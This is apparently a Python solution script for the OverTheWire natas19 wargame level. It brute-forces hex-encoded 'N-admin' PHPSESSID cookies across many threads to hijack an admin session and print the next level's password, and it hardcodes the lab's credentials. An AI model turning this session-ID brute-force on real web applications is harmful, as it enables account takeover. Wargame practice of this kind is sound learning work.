import requests
import concurrent.futures

url = "http://natas19.natas.labs.overthewire.org/"
max_id = 641
username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
matcher = 'Password: '


def get_password(i):
    session_info = {'PHPSESSID': (str(i) + "-admin").encode('utf-8').hex()}
    req = requests.get(
        url=url,
        auth=(username, password),
        cookies=session_info
    )

    if matcher in req.text:
        print(req.text)


with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(get_password, list(range(641)))
